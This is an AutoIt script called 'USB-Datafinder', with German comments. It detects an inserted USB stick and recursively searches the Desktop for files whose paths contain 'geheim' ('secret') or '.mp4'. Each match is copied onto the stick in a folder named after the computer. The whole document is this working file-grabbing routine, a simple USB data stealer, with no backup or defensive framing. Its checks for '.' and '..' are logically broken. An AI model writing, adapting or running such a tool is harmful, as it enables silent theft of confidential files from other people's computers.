;Autor: Luis Huber
;Name: USB-Datafinder




Global $path = @DesktopDir          ;Pfad festlegen in dem gesucht werden soll Unterordner sind eingschlossen
Global $search = "geheim"           ;Schlüsselwort oder Endung nach der Gesucht werden soll

					; Für weitere suchen
Global $path2 = @DesktopDir          ;Pfad festlegen in dem gesucht werden soll Unterordner sind eingschlossen
Global $search2 = ".mp4"           ;Schlüsselwort oder Endung nach der Gesucht werden soll



$var = DriveGetDrive("REMOVABLE")   ;erkennen eines USB-Sticks
$letter = $var[$var[0]]

If Not @error Then
    MsgBox(4096, "USB Drive ",$letter )
 Else
	Exit
 EndIf



Search($path, $search) ;Suche
Search($path2, $search2) ;Für 2te Suche



Func Search($current,$ext)

    Local $search = FileFindFirstFile($current & "\*.*")
    While 1
        Dim $file = FileFindNextFile($search)
        If @error Or StringLen($file) < 1 Then ExitLoop
        If Not StringInStr(FileGetAttrib($current & "\" & $file), "D") And ($file <> "." Or $file <> "..") Then

            If StringInStr($current & "\" & $file, $ext) then
               FileCopy( $current & "\" & $file,$letter & "\" & @ComputerName & "\" & $file ,8) ;Daten werden auf Stick kopiert.
            Endif
        EndIf
        If StringInStr(FileGetAttrib($current & "\" & $file), "D") And ($file <> "." Or $file <> "..") Then
            Search($current & "\" & $file, $ext)

        EndIf
    WEnd
    FileClose($search)

EndFunc


